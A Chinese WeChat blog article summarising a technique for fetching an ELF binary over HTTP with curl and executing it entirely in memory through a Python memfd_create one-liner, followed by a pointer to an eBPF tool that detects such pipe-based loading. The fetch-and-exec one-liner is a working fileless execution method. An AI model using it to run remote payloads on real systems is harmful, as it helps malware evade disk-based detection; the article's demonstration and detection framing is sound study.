---
title: 从内存中直接加载执行ELF
url: https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&mid=2247486253&idx=1&sn=f48382e11d1f98b20177c5e4d1ae5aee&chksm=fab2c812cdc54104eed9eaf3dd8b9014c579e67d18cef6fc8bfbbd4286a7c5b612b457c995ac&scene=58&subscene=0#rd
source: 青衣十三楼飞花堂
date: 2022-10-20
fetch_date: 2025-10-03T20:23:36.658729
---

# 从内存中直接加载执行ELF

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VbJOzZqovPOXDfuCUBbYfAHZq3YF8H1lgwJgmIrD6qkWeahiaRntBW9icG1L8w6zHICrx35aEicLwXcxJiao0KKo0A/0?wx_fmt=jpeg)

# 从内存中直接加载执行ELF

Pat H

青衣十三楼飞花堂

```
作者: Pat H
创建: 2021-02-15
```

参看

```
Using eBPF to uncover in-memory loading - Pat H [2021-02-15]
https://blog.tofile.dev/2021/02/15/ebpf-01.html
```

作者给了一个完整示例，从内存中直接加载执行ELF。bluerust推荐过memfd\_create，但我现在很少用C编程，未实践过。Pat H给了Python版示例，演示效果极佳。

假设WEB服务在此

```
cp /usr/bin/id .
python3 -m http.server -b 192.168.65.25 8080
```

在客户端验证WEB服务正常

```
curl -s http://192.168.65.25:8080/id | xxd -s 0 -l 32 -g 1
```

在客户端确认memfd\_create系统调用号是319

```
$ grep "__NR_memfd_create" /usr/include/asm/unistd_64.h
#define __NR_memfd_create 319
```

在客户端用curl远程拉id回来，不写硬盘，直接执行

```
curl -s http://192.168.65.25:8080/id | python3 -c '
import sys, os, ctypes
libc            = ctypes.CDLL( "libc.so.6" )
memfd_create    = 319
fd              = libc.syscall( memfd_create, "", 0 )
data            = sys.stdin.buffer.read()
os.write( fd, data )
path            = f"/proc/self/fd/{fd}"
os.execv( path, [path,] )
'
```

参看

```
BPF-PipeSnoop
https://github.com/pathtofile/bpf-pipesnoop
```

Pat H用eBPF实现对shell管道操作的监控，这是个C项目，应该可以改写成BCC项目。

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/VbJOzZqovPPoySptTrxD06kCctXhGgQYZW0c0DRia8IJn5AbKdQCtQjACoUdkP9QvsXo0icz8JYQ55t7Gv0L6YcA/0?wx_fmt=png)

青衣十三楼飞花堂

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/VbJOzZqovPPoySptTrxD06kCctXhGgQYZW0c0DRia8IJn5AbKdQCtQjACoUdkP9QvsXo0icz8JYQ55t7Gv0L6YcA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过